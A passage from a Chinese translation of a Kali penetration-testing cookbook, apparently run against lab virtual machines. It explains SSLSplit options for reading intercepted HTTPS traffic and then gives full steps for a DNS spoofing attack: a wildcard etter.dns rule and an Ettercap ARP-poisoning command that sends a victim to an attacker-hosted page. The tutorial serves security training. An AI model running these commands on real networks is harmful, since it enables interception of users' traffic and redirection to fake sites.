    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-5-3.jpg)
    
现在，即使 Ettercap 和 Wireshark 只能看到加密数据，我么也可以以纯文本在 SSLSplit 中查看通信。

### 工作原理

这个秘籍中，我们继续 SSL 连接上的攻击。在第一步中，我们创建了目录，其中 SSLSplit 会将捕获到的信息存在里面。

第二部就是使用下列命令执行 SSLSplit：

+   `-D`：这是在前台运行 SSLSplit，并不是守护进程，并带有详细的输出。

+   `-l connections.log`：这将每个连接的记录保存到当前目录的` connections.log`中。

+   `-j /tmp/sslsplit`：这用于建立`jail directory`目录，`/tmp/sslsplit`会作为 root（`chroot`）包含 SSLSplit 的环境。

+   `-S logdir`：这用于告诉 SSLSplit 将内容日志（所有请求和响应）保存到`logdir`（在 jail 目录中），并将数据保存到单独的文件中。

+   `-k`和`-c`：这用于指明和充当 CA 时，SSLSplit 所使用的私钥和证书。

+   `ssl 0.0.0.0 8443`：这告诉 SSLSplit 在哪里监听 HTTPS（或者其它加密协议）连接。要记住这是我们在上一章中使用 iptables 从 443 转发的接口。

+   `tcp 0.0.0.0 8080`：这告诉 SSLSplit 在哪里监听 HTTP 连接。要记住这是我们在上一章中使用 iptables 从 80 转发的接口。

在执行这些命令之后，我们等待客户端浏览器服务器的 HTTPS 页面并提交数据，之后我们检查日志文件来发现未加密的信息。

## 8.6 执行 DNS 欺骗并重定向流量

DNS 欺骗是一种攻击，其中执行 MITM 攻击的攻击者使用它来修改响应受害者的 DNS 服务器中的名称解析，发送给他们恶意页面，而不是他们请求的页面，但仍然使用有效名称。

这个秘籍中，我们会使用 Ettercap 来执行 DNS 欺骗攻击，并在受害者打算浏览别的网站时，使其浏览我们的网站。

### 准备

对于这个秘籍，我们需要使用我们的 WIndows 客户端虚拟机，但是这次网络识别器桥接到 DNS 解析中。这个秘籍中它的 IP 地址为 192.168.71.14。

攻击者的机器是我们的 Kali 主机，IP 为  192.168.71.8。它也需要运行 Apache 服务器，并拥有`index.html`演示页面，我们会包含下列东西：

```html
<h1>Spoofed SITE</h1>
```

### 操作步骤

1.  假设我们已经启动了 Apache 服务器，并正确配置了伪造页面，让我们编辑`/etc/ettercap/etter.dns`，使它仅仅包含下面这一行：

    ```
    * A 192.168.71.8 
    ```
    
    我们仅仅设置一条规则：所有 A 记录（地址记录）都解析到`192.168.71.8`，这是我们 Kali 的地址。我们可以设置其他条目，但是我们打算在这里避免干扰。
    
2.  这次，我们从命令行运行 Ettercap。打开 root 终端并键入下列命令：

    ```
    ettercap -i wlan0 -T -P dns_spoof -M arp /192.168.71.14///
    ```
    
    它会以文本模式运行 Ettercap，并开启 DNS 欺骗插件来执行 ARP 欺骗攻击，目标仅仅设置为`192.168.71.14`。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-6-1.jpg)
    
3.  启动攻击之后，我们来到客户端主机，并尝试通过网站自己的域名来浏览网站，例如，` www.yahoo.com`，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-6-2.jpg)
    
    要注意，现在地址和标签栏显示原始站点的名称，但是内容来自不同的地方。
    
4.  我们也可以尝试使用`nslookup`执行地址解析，像这样：

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-web-pentest-cb/img/8-6-3.jpg)
    
### 工作原理

这个秘籍中，我们看到如何使用中间人攻击来强制用户浏览某个页面，他们甚至相信自己在其它站点上。

在第一步中，我们修改了 Ettercap 的名称解析文件，让它将所有请求的名称重定向到我们的 Kali 主机。

之后，我们以下列参数运行 Ettercap：`-i wlan0 -T -P dns_spoof -M arp /192.168.71.14///`。

+   `-i wlan0`：要技术我们需要客户端进行 DNS 解析，所以我们需要让它连接到桥接的适配器，并到达我们的 Kali 主机，所以我们将嗅探接口设为`wlan0`（攻击者计算机上的无线网卡）。

+   `-T`：使用纯文本界面。

+   `-P dns_spoof`：启动 DNS 欺骗插件。

+   `-M arp`：执行 ARP 欺骗攻击。

+   `/192.168.71.14///`：这是我们在命令行中对 Ettercap 设置目标的方式：`MAC/ip_address/port`。其中`//`表示任何对应 IP 192.168.71.14（客户端）任何端口的 MAC 地址。

最后，我们确认了攻击能够正常工作。

### 另见

也有另一个非常实用的用于这些类型攻击的工具，叫做 dnsspoof。你应该下载下来并加入工具库：

```
man dnsspoof
```

http://www.monkey.org/~dugsong/dsniff/

另一个值得提及的工具是中间人攻击框架：MITMf。它包含内建的 ARP 毒化、DNS 欺骗、WPAD 代理服务器，以及其它攻击类型的功能。

```
mitmf --help
```
